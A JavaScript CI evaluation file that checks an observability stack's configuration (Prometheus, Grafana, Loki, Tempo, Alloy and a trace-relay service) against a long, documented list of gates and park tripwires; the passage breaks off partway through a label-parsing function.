// observability-stack-config.eval.mjs — m20e gates G6 (m20b carryover) + G9
// (relay/correlation/$trace_pair_set + the 13r-b mr-trace-relay integration)
// + the 13r-a and P5-otlp-export park tripwires.
//
// WHAT THIS PROVES, AND WHERE
//   T-a..T-g (always, FIRST) — PROOF-OF-TEETH over inline fixtures. Every
//                    detector below is first shown to REJECT the shape it
//                    exists to catch. A gate that has never failed is a
//                    decoration.
//   C1-C18 (always) — the m20b stack-config predicates
//                    (ops/observability/checks/stack-config-checks.mjs) run
//                    against the REAL committed files. That module is the SSOT
//                    and is imported, never re-implemented; before this eval
//                    existed NOTHING in CI ran it (`just test` is cargo-only,
//                    justfile:24-26), so 1869 lines of predicates were dark.
//   G9a/G9b (always) — the D17 correlation pivot exists in BOTH directions,
//                    key-path scoped rather than file-wide substring.
//   G9c (always)   — `connection_id` is a log FIELD and a span ATTRIBUTE only,
//                    never a Loki or Prometheus LABEL (OBS-35/D12).
//   G9d (always)   — `$trace_pair_set` is read in 4 fail-loud stages. A missing
//                    file is NOT the empty set (anti-pattern 1).
//   G9e (always)   — membership excludes `movement_tick`, every PARSED $slo_set
//                    member, and every criterion bench id (OBS-50). The $slo_set
//                    is parsed from recording.rules.yml's own matchers, never
//                    re-spelled here; both matcher copies are parsed and must
//                    agree (AM11).
//   G9f (always)   — EXACT set equality between the committed membership and
//                    the reducers that actually carry a paired enter/exit
//                    breadcrumb, both directions reported separately (OBS-50's
//                    single-source-of-truth extension, spec:652-655).
//   G9h (always)   — SUPERSESSION TRIPWIRE. The day a paired call site appears,
//                    observability-log-wrapper.eval.mjs:1589 and
//                    observability_tests.rs:944 must be retired in the same
//                    change, and G11 must have run first (OBS-51).
//   G9i (always)   — the relay accepts no module-owner credential, NEVER writes
//                    (neither the batch CLI nor the daemon has an `--out` flag,
//                    so there is no blessed write call to hide behind), spells
//                    neither `0.0.0.0` nor `://` in code, and its pure core
//                    touches no filesystem at all (OBS-45). "Always" is literal:
//                    when the files are absent it fails saying so, rather than
//                    falling silent.
//   G9j (always)   — relay hygiene over EVERY .mjs under relay/, walked
//                    RECURSIVELY (tests and subdirectories included, per AM12's
//                    scope), in THREE ban tiers (PURE / DAEMON / DAEMON-TEST),
//                    plus the EXACT production file set: a missing file fails,
//                    and an unexpected extra non-test .mjs fails (anti-smuggling
//                    — a second daemon cannot creep in under a new filename).
//                    Every present .mjs must resolve to EXACTLY ONE tier: a
//                    filename-keyed tier map otherwise fails OPEN for a file
//                    nobody remembered to list, and the lists are hand-edited.
//                    The DAEMON tier's EGRESS ban is the P5 TRIPWIRE — see the
//                    `PARKED — P5-otlp-export` block below.
//   G9k (always)   — runs `node --test` over the relay suites AND the m20b
//                    checks suites. This is the only door those suites have:
//                    nothing else in `just ci` executes them.
//   G9n (always)   — OBS-45's "the SAME read-only bind mount as Alloy", which
//                    until 13r-b was UNGATED. Scoped to the `mr-trace-relay`
//                    service BLOCK and, inside it, to its `volumes:` sub-block:
//                    a mount whose SOURCE half is string-equal to Alloy's
//                    replicas source, ending `:ro`, with `--logs-dir` pointing
//                    inside that mount's CONTAINER target. Plus the injection
//                    surface every merged predicate misses on this service
//                    (checkNoExecLogSource is hardcoded to `alloy`,
//                    checks/stack-config-checks.mjs:539-570): no `entrypoint:`,
//                    no shell marker, no `env_file:`, no `environment:` key at
//                    all, and a `command:` flag-name ALLOWLIST.
//   G9o (always)   — OBS-46's scrape target: `job_name: mr-trace-relay` resolved
//                    INSIDE `scrape_configs:` (a top-level `x-parked:` decoy must
//                    not satisfy it), `metrics_path: /health`, host 127.0.0.1,
//                    and a port CROSS-RESOLVED from the relay's own compose
//                    `--web.listen-address` — co-occurrence is not wiring, and a
//                    file-wide search for that flag returns PROMETHEUS's 9090.
//   G9p (always)   — OBS-46's dead-man's switch, asserted as something that can
//                    actually FIRE. Beyond "an expr mentioning the relay job":
//                    the `condition:` refId must resolve to a threshold node over
//                    the refId that carries the relay expr, and its node type,
//                    evaluator type, params, datasourceUid, severity label and
//                    `for:` are all DERIVED FROM THE AlloyDown RULE IN THE SAME
//                    DOCUMENT rather than re-spelled here. Not paused, distinct
//                    uid, group interval no coarser than AlloyDown's, and the
//                    relay expr must NOT also match `job="alloy"` — spec:542-547
//                    calls one rule watching two processes unbuildable.
//   L2 (MR_OBS_STACK=1) — LIVE: Prometheus's own /api/v1/targets reports the
//                    `mr-trace-relay` target with `health: "up"`. This is the
//                    criterion-level proof of OBS-46 and the only thing that
//                    catches a /health body Prometheus cannot parse. The skip is
//                    STATED when the flag is absent, never silent.
//   T-h..T-l (always, FIRST) — PROOF-OF-TEETH for the 13r-a boot tripwires
//                    below, over inline fixtures. Every one asserts the GOOD
//                    shape is ACCEPTED as well as the bad one rejected.
//   T-m..T-p (always, FIRST) — PROOF-OF-TEETH for 13r-b's G9n/G9o/G9p and the
//                    retiered G9i/G9j, over inline fixtures. Written as EXECUTED
//                    CHEATS rather than as a review of the detectors: this
//                    repo's own history records that a reviewer READING gate
//                    tests found zero bypasses while one who WROTE the cheat
//                    found four. T-a is INVERTED by this slice (P1 graduated:
//                    the 8-service compose is now the shape that must be
//                    ACCEPTED, and the 7-service one the shape that must not).
//   G12a (always)  — TEMPO PARK TRIPWIRE (ADR-0190 D1). The `command:` list is
//                    exactly, IN ORDER, the two committed flags — a SUBSET means
//                    the parked flag was removed (convert this gate per the
//                    PARKED — 13r-a block below), a SUPERSET means a new,
//                    possibly-undefined flag appeared. Plus the pinned image TAG
//                    (a version bump, not a CVE rebuild, must force
//                    re-verification), and the park's VISIBILITY: no `profiles:`,
//                    no `extends:`, `restart: unless-stopped`. A parked failure
//                    that vanishes from `docker compose ps` reads as closed.
//   G12b (always)  — every alert-rule group in EVERY document under
//                    grafana/provisioning/alerting/ (Grafana loads the whole
//                    provisioned directory; a sibling file with a bad interval
//                    crashes provisioning just as hard) declares exactly one
//                    `interval:`, which parses, is non-zero and is a multiple of
//                    Grafana's 10s scheduler tick. Every `for:` parses and is an
//                    exact multiple of its OWN group's interval — a repo
//                    convention, not a Grafana rule. Exact expected file set, and
//                    the grafana image TAG is pinned because the 10s tick is
//                    image-dependent.
//   G12c (always)  — the Dockerfile's FINAL stage removes the caddy binary's
//                    net-bind capability, as the LAST instruction that writes
//                    /usr/bin/caddy (buildkit preserves file capabilities across
//                    `COPY --from=`, so a later copy silently re-adds it), before
//                    exactly one `USER`. Stage-aware: a setcap in a discarded
//                    builder stage is not a fix.
//   G12d (always)  — the alloy service block is a KEY ALLOWLIST, not a
//                    four-property checklist: `privileged: true`, `group_add`,
//                    `pid: host` and friends each hand back everything the
//                    non-root + cap_drop posture just took away, while every
//                    property check stays green.
//   G12e (always)  — the S4 label-VALUE bounds are pinned character-for-character
//                    INSIDE otelcol.processor.transform "s4_keep"'s own
//                    `statements` list, not file-wide: the same two statements
//                    moved verbatim into an unwired component keep a file-wide
//                    check green while the live pipeline loses the bound.
//
//   G13a (always)  — 16r-e: the `mr-scheduler` recording-rule group (scheduled-
//                    function LATENESS). Exactly one `- record:` rule selects
//                    `spacetime_scheduled_function_delay_seconds_bucket` with
//                    `le="+Inf"`, and exactly one with `le="0.05"`, parsed from
//                    COMMENT-STRIPPED text so a commented-out decoy rule is not
//                    counted. The per-invocation label is `function` — MEASURED
//                    against a live SpacetimeDB 2.8.1 `/v1/metrics` scrape —
//                    and `reducer` appears in NO selector of this metric
//                    family: PromQL silently matches nothing on a non-existent
//                    label key, so a `reducer=~` harmonisation "fix" would
//                    record an empty series forever. The four scoped names are
//                    compared as a SET, never a count, and the numerator and
//                    denominator selectors must carry the IDENTICAL set. The
//                    ratio rule DERIVES from the two recorded series names and
//                    inlines no `function=~` matcher of its own, so the
//                    allowlist appears exactly TWICE in the whole file for
//                    this metric.
//   G13b (always)  — the dashboard panel for
//                    `mr:scheduled_function_late:ratio5m`: exactly one panel, a
//                    unique `id`, a `gridPos` rectangle DISJOINT from every
//                    other panel's (`checkDashboardPanelsReal` cannot see a
//                    layout overlap, and a stacked panel renders broken with
//                    green CI), `legendFormat` carrying `{{function}}`, `unit:
//                    percentunit` (a ratio, not a duration), and a
//                    `thresholds.steps` value READ FROM THE ALERT's own
//                    evaluator param rather than a second, independently
//                    maintained literal.
//   G13c (always)  — the alert rule itself, via `parseAlertingRules`: exactly
//                    one rule referencing the ratio series, `severity:
//                    warning`, not paused, a uid distinct from every other
//                    parsed uid, a `condition:` refId that resolves inside its
//                    own `data:` list, a `threshold`/`gt` node with exactly one
//                    param (a delay alert that fires when LATENESS IS LOW is
//                    inverted), a query datasource DERIVED from
//                    AlloyIngestStalled's own (never restated), `noDataState:
//                    OK`, and a `for:` that is both a non-zero exact multiple
//                    of its OWN group interval AND strictly greater than the
//                    recorded series' `[5m]` rate window — DERIVED from that
//                    literal, not restated — the debounce that keeps one late
//                    one-shot reaper invocation from firing the alert.
//   G13d (always)  — number identity + lattice: the alert's evaluator param and
//                    the panel's threshold step must be the SAME number, and
//                    the on-time selector's `le=` value must be a MEMBER of
//                    `SCHEDULED_DELAY_BUCKET_EDGES`, the measured 2.8.1 bucket
//                    lattice (there is no 0.03 edge). Pinning the LATTICE
//                    rather than the literal means a retune to another real
//                    edge (0.1) needs no gate edit, while an off-lattice value
//                    (0.03) reds.
//   G13e (always)  — the numbered-provenance comment block above the
//                    mr-scheduler rules names 30ms as SpacetimeDB's OWN
//                    late-start `log::warn!` threshold, NOT a bucket edge. This
//                    gate scans RAW text ON PURPOSE: `stripHashComments`
//                    deletes precisely the `#` prose it is looking for, so
//                    feeding it comment-stripped text would make it silently
//                    and permanently vacuous — the exact trap it exists to
//                    avoid falling into itself.
//   T-q..T-u (always, FIRST) — PROOF-OF-TEETH for G13a-e, over inline
//                    fixtures, in the T-o idiom (assert the compliant shape is
//                    ACCEPTED before any mutation is asserted REJECTED).
//
// PARKED — 13r-a (verbatim; do NOT paraphrase into a TBD, anti-pattern 11):
//   D1  grafana/tempo:2.10.7 has NO listen-ADDRESS flag at all, so the committed
//       `-server.http-listen-address=127.0.0.1` is a flag tempo cannot parse and
//       C6's "all 7 services bind 127.0.0.1 only" is VACUOUS FOR TEMPO — tempo's
//       real binding lives in tempo/tempo-config.yml:9,11, which no gate reads.
//       G12a's job is to pin that known-false statement in place until the
//       follow-up lands; without it the next reader takes C6's green as proof.
//   The follow-up prescription, in order (ADR-0190 D1):
//     1. checks/stack-config-checks.mjs — checkListenAddrsLoopback stops being a
//        flat LISTEN_FLAGS scan and gains per-service binding sources: for tempo,
//        read http_listen_address / grpc_listen_address from
//        tempo/tempo-config.yml. Its signature gains the tempo config text, so
//        TWO call sites move: this eval's C6 and the checks suite's REAL-FILES
//        test.
//     2. checks/stack-config-checks.test.mjs — new teeth: tempo with no flag and
//        a config binding 0.0.0.0 FAILS; with a config binding 127.0.0.1 PASSES;
//        a missing or unreadable tempo config FAILS (absence is not loopback).
//        Re-derive NODE_TEST_PASS_FLOOR.
//     3. docker-compose.yml — delete the `-server.http-listen-address=127.0.0.1`
//        list item.
//     4. this eval — convert G12a to its post-fix form (expected list =
//        `-config.file=/etc/tempo/tempo-config.yml` only) and delete this block.
//     5. Proof: `docker compose up -d tempo` reaches a non-restarting state, and
//        `/tempo -help` is re-run if the image tag moved.
//   This block is SEPARATE from the m20e-2 block below ON PURPOSE: that park is
//   scoped to m20e-2 and G9g's failure message names P1-P4 by number. Adding a
//   P5 there would make the header lie and desynchronise G9g.
//
// GRADUATED — m20e-2 / 13r-b. P1-P4 are no longer parked; they are live gates,
// and the tripwire that guarded them (G9g, with its checkNoRelayScrapeJob /
// checkNoRelayAlertRule negatives) is DELETED rather than inverted in place — a
// same-named predicate whose polarity flipped is a trap for the next reader.
//   P1 -> C3   checkServiceSetExact(compose, EIGHT_SERVICES)      (spec:650)
//   P2 -> C5 + G9n  the RELAY's own replicas mount, `:ro` not `:rw`, sourced
//                   from the SAME host path as Alloy's (OBS-45; spec:650-651).
//                   C5 alone is NOT enough: its only non-vacuity floor is
//                   `found === 0` (checks/stack-config-checks.mjs:436), so a
//                   relay with NO mount at all leaves alloy's `found === 1` and
//                   C5 still passes. G9n closes that.
//   P3 -> G9o  prometheus.yml `job_name: mr-trace-relay` -> /health (OBS-46;
//              spec:655-656)
//   P4 -> G9p  the grafana dead-man's switch on that target's `up`, DISTINCT
//              from AlloyDown and able to FIRE (OBS-46; spec:656-657)
//
// PARKED — P5-otlp-export (verbatim; do NOT paraphrase into a TBD, anti-pattern 11):
//   P5  the OTLP POST client. As shipped in 13r-b the daemon emits its OTLP/HTTP
//       JSON document to STDOUT — the identical contract the batch CLI already
//       carries (relay/mr-trace-relay.mjs:4-12) — and `docker compose logs
//       mr-trace-relay` is the sink. Nothing ingests it. This costs zero
//       observability TODAY and only today: `$trace_pair_set` is EMPTY
//       (ADR-0180:1022, relay/README.md), so the reconstructed document is
//       `{"resourceSpans":[]}` REGARDLESS of sink. Building the client now would
//       add an HTTP egress surface, a retry/backoff state machine and a
//       header-allowlist obligation to POST an empty array on a loop.
//   The un-defer trigger is ALREADY MECHANIZED, not remembered: G9h reds at the
//   first paired call site, i.e. the first moment a span could exist. When P5
//   graduates, the SAME change must (1) add the transport as an INJECTED seam
//   with its outgoing header key set asserted exactly (never an Authorization or
//   x-api-key header), (2) relax exactly the needles it needs from
//   DAEMON_EGRESS_BANS below, naming each one and why, and (3) delete this block.
//   Until then the daemon has ZERO egress and G9j's DAEMON tier bans it flatly:
//   `fetch(`, `.request(`, `.connect(`, `node:https`, `node:net` and `undici`
//   are all banned in daemon.mjs, so the moment an outbound POST lands there
//   WITHOUT this block being graduated, G9j reds and names P5. Do NOT widen the
//   ban list to make a POST fit — graduate the park.
//
// MEASURED COST (S3): the G9k subprocess is the only non-trivial cost in this
// eval; it is bounded by NODE_TEST_TIMEOUT_MS and its wall time is recorded in
// the slice handoff.
//
// NO `new RegExp(` anywhere. No regex at all, in fact — String methods and
// hand-rolled walkers only (the remote Semgrep detect-non-literal-regexp gate
// has red-ed this repo 3x). `spawnSync` is called with ARRAY ARGS only, never a
// shell string. No `Date.now` in any assertion. No fixture file is written to
// disk: every fixture below is an inline string.

import { spawnSync } from 'node:child_process';
import { existsSync, readdirSync, readFileSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import {
  checkAlertRuleHasReceiver,
  checkCaddyDualPosture,
  checkDashboardPanelsReal,
  checkListenAddrsLoopback,
  checkModuleLogsMountReadOnly,
  checkNoAlertingBlock,
  checkNoExecLogSource,
  checkNoQuotedCredential,
  checkQueriedSeriesAreDefined,
  checkRemoteWriteBothEnds,
  checkRetentionConfigured,
  checkRulesAreRecordOnly,
  checkRunbookHasRunnableSteps,
  checkS4AttributeValuesBounded,
  checkS4MetricLabelsBounded,
  checkServiceImagesPinned,
  checkServiceSetExact,
  checkStageMetricsLabelsBounded,
} from '../ops/observability/checks/stack-config-checks.mjs';

// ===========================================================================
// Constants
// ===========================================================================

const NAME =
  'observability-stack-config (G6 + G9 + mr-trace-relay integration + 13r-a/P5 park ' +
  'tripwires + 16r-e scheduled-function lateness G13a-e, ADR-0180/0190/0191)';

const OPS = 'ops/observability';
const RELAY_REL = `${OPS}/relay`;

const RELAY_SERVICE_NAME = 'mr-trace-relay';

/**
 * D3/OBS-19: the stack is exactly these EIGHT services, no more, no fewer.
 *
 * 13r-b: `mr-trace-relay` is the 8th (P1, spec:650 / OBS-46). It was parked
 * through m20b and m20e-2 because config-without-service pins `up=0` forever and
 * service-without-config is dead code; this slice lands BOTH halves at once, so
 * the park is discharged rather than waived. The set is compared for EQUALITY,
 * never counted — a substitution keeps the count identical (T-a).
 */
export const EIGHT_SERVICES = [
  'prometheus',
  'alloy',
  'loki',
  'tempo',
  'grafana',
  'node_exporter',
  'caddy',
  RELAY_SERVICE_NAME,
];

/**
 * OBS-37's banned-tool half, pinned by REPOSITORY rather than by digest.
 * The digest is read from the compose file (a digest bump is a legitimate,
 * reviewed change and must not require editing three files); the repository
 * name is what a banned tool would have to change, and it is pinned here.
 *
 * 13r-b (D5): the relay runs the STOCK `node` image, digest-pinned like every
 * other pulled image — it is deliberately NOT a second built stage, because
 * ADR-0180 D3 makes caddy "the ONE image built rather than pulled" and gives it
 * a differentiated upstream-CVE obligation the other services do not carry.
 * C4 requires the image-bearing service set to equal this map's KEY set exactly,
 * so this entry is not optional bookkeeping: without it C4 reds.
 */
export const ALLOWED_IMAGE_REPOS = {
  prometheus: 'prom/prometheus',
  alloy: 'grafana/alloy',
  loki: 'grafana/loki',
  tempo: 'grafana/tempo',
  grafana: 'grafana/grafana',
  node_exporter: 'prom/node-exporter',
  [RELAY_SERVICE_NAME]: 'node',
};

/** D12/OBS-36: the S2 label enum. `caddy` builds from a Dockerfile, no image. */
const D12_ALLOWED_LABELS = ['reducer', 'evt'];

/**
 * C15 (`checkQueriedSeriesAreDefined`) treats a queried series that no recording
 * rule defines as DANGLING unless its name starts with one of these prefixes,
 * i.e. unless it is host-native rather than repo-defined.
 *
 * 13r-b (AM3) adds `mr_trace_relay_`: the daemon's /health endpoint serves a
 * real, LABEL-FREE exposition body (`mr_trace_relay_lines_read_total` and
 * `mr_trace_relay_last_read_timestamp_seconds`) rather than an empty one. That
 * is not decoration — it is what makes the body a valid exposition document BY
 * CONSTRUCTION, closing the whole "200 with a body Prometheus cannot parse ->
 * up=0 -> the dead-man's switch pinned firing" landmine class (verified against
 * prom/prometheus:v3.13.2: `ok` -> up=0, `204 No Content` -> up=0), and it is
 * what makes a SILENTLY STALLED tail visible, which `up` alone cannot catch.
 */
const HOST_NATIVE_ALLOWLIST = ['up', 'spacetime_', 'node_', 'mr_trace_relay_'];

/** OBS-50: never in `$trace_pair_set`, independent of any parsed set. */
const ALWAYS_BANNED_REDUCER = 'movement_tick';

/**
 * The relay's file layout (D1). `tail.mjs` is the PURE tail state machine —
 * `{path, prevOffset, prevIdentity}` + a fresh observation -> `{readFrom,
 * readTo, reason}`, with no fs, clock, timer or socket reachable from any path —
 * so it joins the pure core rather than the shell. `daemon.mjs` is the
 * imperative shell that owns statSync/createReadStream, the node:http /health
 * server and the single timer.
 */
const RELAY_PURE_FILES = ['parse.mjs', 'pair.mjs', 'otlp.mjs', 'reconstruct.mjs', 'tail.mjs'];
const RELAY_BATCH_CLI_FILE = 'mr-trace-relay.mjs';
const RELAY_DAEMON_FILE = 'daemon.mjs';
const RELAY_DAEMON_TEST_FILE = 'daemon.test.mjs';
const RELAY_SHELL_FILES = [RELAY_BATCH_CLI_FILE, RELAY_DAEMON_FILE];
const RELAY_PRODUCTION_FILES = [...RELAY_PURE_FILES, ...RELAY_SHELL_FILES];
const RELAY_PURE_TEST_FILES = RELAY_PURE_FILES.map((f) => f.replace('.mjs', '.test.mjs'));
const RELAY_TEST_FILES = [...RELAY_PURE_TEST_FILES, RELAY_DAEMON_TEST_FILE];

const TRACE_PAIR_SET_REL = `${RELAY_REL}/trace-pair-set.json`;

/**
 * G9k's spawned suites — an EXPLICIT list, never a glob: a glob silently runs
 * fewer files the day one is renamed, and "0 files, 0 failures" exits 0.
 *
 * FLOOR DERIVATION (re-run after adding or removing any test in these files):
 *   grep -c '^test(' ops/observability/relay/*.test.mjs ops/observability/checks/*.test.mjs
 * Before 13r-b: parse 21 + pair 18 + otlp 14 + reconstruct 12 = 65 relay, plus
 * checks 103 + redteam 13 = 116, total 181.
 *
 * At 13r-b: parse 21 + pair 18 + otlp 14 + reconstruct 12 + tail 29 +
 * daemon 33 = 127 relay, plus checks 103 + redteam 13 = 116, total 243.
 * Re-derived with the grep above run VERBATIM, not carried forward by
 * arithmetic on the old figure. Do NOT guess this number: a floor set below the
 * real count is a suite that can silently stop running, and a floor set above
 * it reds a green tree.
 *
 * 16r-e adds NO node:test files (G13a-e are pure-function gates proven by
 * inline teeth like every other gate in this eval), so this floor is
 * DELIBERATELY UNCHANGED — re-deriving it here would be a false signal that a
 * suite moved when none did.
 */
const NODE_TEST_FILES = [
  ...RELAY_TEST_FILES.map((f) => `${RELAY_REL}/${f}`),
  `${OPS}/checks/stack-config-checks.test.mjs`,
  `${OPS}/checks/stack-config-checks.redteam.test.mjs`,
];
const NODE_TEST_PASS_FLOOR = 243;
const NODE_TEST_TIMEOUT_MS = 60_000;

/**
 * T-g's non-vacuity floor: the number of REAL committed files this eval reads
 * through `readReal`. Scanning nothing is never green.
 *
 * FLOOR DERIVATION (re-derive, never guess, when a readReal call site is added):
 * the 14 distinct paths in the real-file try block, plus `ops/observability/
 * Dockerfile` (13r-a, G12c) = 15. The alerting-directory documents G12b
 * enumerates are `contact-points.yml`, `notification-policies.yml` and
 * `rules.yml`, all three ALREADY among those 14, and READ_FILES is a Set — so
 * they raise the count by 0. C2's rule documents resolve to
 * `rules/recording.rules.yml`, also already counted.
 *
 * 16r-e adds NO new readReal call site: G13a-e read `recordingRules`,
 * `dashboardJson` and `alertRules`, all three already counted above. This
 * floor is DELIBERATELY UNCHANGED.
 */
const FILE_FLOOR = 15;

// ===========================================================================
// Real-file reading (fail-loud, counted)
// ===========================================================================

const READ_FILES = new Set();

/** Read a repo-relative file. A file this eval cannot read is NEVER green. */
export function readReal(rel) {
  let text;
  try {
    text = readFileSync(path.resolve(rel), 'utf8');
  } catch (err) {
    throw new Error(`cannot read ${rel} (${err.code}) — an unreadable input is never green`);
  }
  if (text.trim().length === 0) {
    throw new Error(`${rel} is empty — nothing was scanned, which is never green`);
  }
  READ_FILES.add(rel);
  return text;
}

// ===========================================================================
// Shared text walkers (no regex anywhere)
// ===========================================================================

const fail = (detail) => ({ ok: false, detail });
const pass = (detail) => ({ ok: true, detail });

function indentOf(line) {
  let i = 0;
  while (i < line.length && line[i] === ' ') i++;
  return i;
}

function isAsciiLetter(ch) {
  return (ch >= 'a' && ch <= 'z') || (ch >= 'A' && ch <= 'Z');
}

/** Digits-only integer parse; null for anything else (no regex, no NaN leaks). */
function toInt(text) {
  if (text.length === 0) return null;
  let n = 0;
  for (let i = 0; i < text.length; i++) {
    const c = text[i];
    if (c < '0' || c > '9') return null;
    n = n * 10 + (c.charCodeAt(0) - 48);
  }
  return n;
}

/** Strip `#` comments outside quotes, line by line (YAML). */
export function stripHashComments(text) {
  const out = [];
  for (const line of text.split('\n')) {
    let quote = '';
    let cut = -1;
    for (let i = 0; i < line.length; i++) {
      const ch = line[i];
      if (quote) {
        if (ch === quote) quote = '';
      } else if (ch === '"' || ch === "'") {
        quote = ch;
      } else if (ch === '#') {
        cut = i;
        break;
      }
    }
    out.push(cut === -1 ? line : line.slice(0, cut));
  }
  return out.join('\n');
}

/** Lines strictly deeper-indented than `lines[idx]`, contiguously. */
function subBlock(lines, idx) {
  const base = indentOf(lines[idx]);
  const out = [];
  for (let i = idx + 1; i < lines.length; i++) {
    const line = lines[i];
    if (line.trim().length === 0) {
      out.push(line);
      continue;
    }
    if (indentOf(line) <= base) break;
    out.push(line);
  }
  return out;
}

/** Indices of `<key>:` lines at EXACTLY `indent` (null = any indent). */
function keyIndices(lines, key, indent) {
  const out = [];
  const needle = `${key}:`;
  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    if (line.trim().length === 0) continue;
    if (indent !== null && indentOf(line) !== indent) continue;
    if (line.trim().startsWith(needle)) out.push(i);
  }
  return out;
}

/** The scalar after `<key>:` on `line`, unquoted. */
function scalarOf(line, key) {
  const t = line.trim();
  let value = t.slice(`${key}:`.length).trim();
  if (value.length >= 2) {
    const first = value[0];
    const last = value[value.length - 1];
    if ((first === '"' && last === '"') || (first === "'" && last === "'")) {
      value = value.slice(1, value.length - 1);
    }
  }
  return value;
}

/**
 * Split a block into its `- ` list items, normalising each item's first line so
 * every direct child of an item sits at one consistent indent.
 */
function listItems(lines) {
  let itemIndent = null;
  for (const line of lines) {
    if (line.trim().length === 0) continue;
    if (!line.trim().startsWith('- ')) continue;
    const ind = indentOf(line);
    if (itemIndent === null || ind < itemIndent) itemIndent = ind;
  }
  if (itemIndent === null) return [];
  const items = [];
  let current = null;
  for (const line of lines) {
    if (line.trim().length === 0) {
      if (current) current.push(line);
      continue;
    }
    if (indentOf(line) === itemIndent && line.trim().startsWith('- ')) {
      current = [`${' '.repeat(itemIndent + 2)}${line.trim().slice(2)}`];
      items.push(current);
      continue;
    }
    if (current !== null) current.push(line);
  }
  return items;
}

// ===========================================================================
// G9a/G9b — the D17 correlation pivot, key-path scoped
// ===========================================================================

/** `{ ok, items }` where each item is `{ uid, lines }`. Fails loud on ambiguity. */
export function datasourceItems(datasourcesYmlText) {
  const lines = stripHashComments(datasourcesYmlText).split('\n');
  const roots = [];
  for (let i = 0; i < lines.length; i++) {
    if (lines[i].startsWith('datasources:')) roots.push(i);
  }
  if (roots.length !== 1) {
    return fail(`expected exactly one column-0 \`datasources:\` key, found ${roots.length}`);
  }
  const block = subBlock(lines, roots[0]);
  const rawItems = listItems(block);
  if (rawItems.length === 0) return fail('`datasources:` declares zero entries — nothing scanned');

  const items = [];
  for (const itemLines of rawItems) {
    const uidIdx = keyIndices(itemLines, 'uid', indentOf(itemLines[0]));
    if (uidIdx.length !== 1) {
      return fail(
        `a datasource entry declares ${uidIdx.length} \`uid:\` keys; exactly 1 is required so ` +
          'the entry this check reads is the entry Grafana provisions',
      );
    }
    items.push({ uid: scalarOf(itemLines[uidIdx[0]], 'uid'), lines: itemLines });
  }
  const uids = items.map((i) => i.uid);
  if (new Set(uids).size !== uids.length) {
    return fail(`duplicate datasource uids: ${uids.join(', ')}`);
  }
  return { ok: true, detail: `${items.length} datasource entries: ${uids.join(', ')}`, items };
}

function itemByUid(parsed, uid) {
  return parsed.items.find((i) => i.uid === uid);
}

/** G9a — D17(1): Tempo's tracesToLogsV2 targets Loki and pivots on connection_id. */
export function checkTracesToLogsPivot(datasourcesYmlText) {
  const parsed = datasourceItems(datasourcesYmlText);
  if (!parsed.ok) return fail(`G9a: ${parsed.detail}`);
  const tempo = itemByUid(parsed, 'mr-tempo');
  if (tempo === undefined) return fail('G9a: no datasource with uid `mr-tempo`');

  const childIndent = indentOf(tempo.lines[0]);
  const jsonDataIdx = keyIndices(tempo.lines, 'jsonData', childIndent);
  if (jsonDataIdx.length !== 1) {
    return fail(`G9a: the Tempo entry declares ${jsonDataIdx.length} \`jsonData:\` keys, need 1`);
  }
  const jsonData = subBlock(tempo.lines, jsonDataIdx[0]);
  const t2lIdx = keyIndices(jsonData, 'tracesToLogsV2', null);
  if (t2lIdx.length !== 1) {
    return fail(
      `G9a (D17(1)): the Tempo entry declares ${t2lIdx.length} \`tracesToLogsV2:\` blocks — ` +
        'exactly 1 is required; without it a span cannot pivot to its log lines',
    );
  }
  const t2l = subBlock(jsonData, t2lIdx[0]);
  const uidIdx = keyIndices(t2l, 'datasourceUid', null);
  if (uidIdx.length !== 1) {
    return fail(`G9a: tracesToLogsV2 declares ${uidIdx.length} \`datasourceUid:\` keys, need 1`);
  }
  const target = scalarOf(t2l[uidIdx[0]], 'datasourceUid');
  if (target !== 'mr-loki') {
    return fail(`G9a: tracesToLogsV2 targets \`${target}\`, expected \`mr-loki\``);
  }
  const queryIdx = keyIndices(t2l, 'query', null);
  if (queryIdx.length !== 1) {
    return fail(
      `G9a: tracesToLogsV2 declares ${queryIdx.length} \`query:\` keys — a trace-to-logs block ` +
        'with no query pivots to every log line in the window, which is not a pivot',
    );
  }
  const query = scalarOf(t2l[queryIdx[0]], 'query');
  if (!query.includes('connection_id')) {
    return fail(
      'G9a (D17(1)): tracesToLogsV2 has a query that does not filter on `connection_id` — the ' +
        'session pivot is the whole point; a job-scoped query is a time-window join, not a ' +
        'correlation',
    );
  }
  return pass(`G9a: Tempo tracesToLogsV2 -> mr-loki, filtered on connection_id`);
}

/** G9b — D17(2): BOTH correlation directions exist, each keyed on connection_id. */
export function checkCorrelationBothDirections(datasourcesYmlText) {
  const parsed = datasourceItems(datasourcesYmlText);
  if (!parsed.ok) return fail(`G9b: ${parsed.detail}`);

  const directions = [];
  let totalEntries = 0;
  for (const item of parsed.items) {
    const corrIdx = keyIndices(item.lines, 'correlations', indentOf(item.lines[0]));
    if (corrIdx.length === 0) continue;
    if (corrIdx.length > 1) {
      return fail(`G9b: datasource \`${item.uid}\` declares ${corrIdx.length} correlations blocks`);
    }
    for (const entry of listItems(subBlock(item.lines, corrIdx[0]))) {
      totalEntries++;
      const targetIdx = keyIndices(entry, 'targetUID', null);
      if (targetIdx.length !== 1) {
        return fail(`G9b: a correlation on \`${item.uid}\` declares no single \`targetUID:\``);
      }
      const hasField = entry.some((l) => l.trim() === 'field: connection_id');
      if (!hasField) {
        return fail(
          `G9b (OBS-35/D17): the correlation on \`${item.uid}\` does not key on ` +
            '`field: connection_id` — any other field is a different pivot',
        );
      }
      directions.push(`${item.uid}->${scalarOf(entry[targetIdx[0]], 'targetUID')}`);
    }
  }

  for (const required of ['mr-loki->mr-tempo', 'mr-tempo->mr-loki']) {
    if (!directions.includes(required)) {
      return fail(
        `G9b (D17(2)): the \`${required}\` correlation is missing (found: ` +
          `${directions.join(', ') || 'none'}). Correlations are one-way; neither direction can ` +
          'be replaced by the other, so >= 1 is not the bar — BOTH are.',
      );
    }
  }
  if (totalEntries !== 2) {
    return fail(
      `G9b: found ${totalEntries} correlation entries; exactly 2 are expected (one per ` +
        'direction) so a third, unreviewed pivot cannot ride along unnoticed',
    );
  }
  return pass(`G9b: both correlation directions present (${directions.join(', ')})`);
}

// ===========================================================================
// G9c — connection_id is never a label
// ===========================================================================

/** The label keys declared by Alloy's `stage.labels { values = { ... } }`. */
export function alloyStageLabelKeys(alloyText) {
  const at = alloyText.indexOf('stage.labels');
  if (at === -1) return null;
  const valuesAt = alloyText.indexOf('values', at);
  if (valuesAt === -1) return null;
  const open = alloyText.indexOf('{', valuesAt);
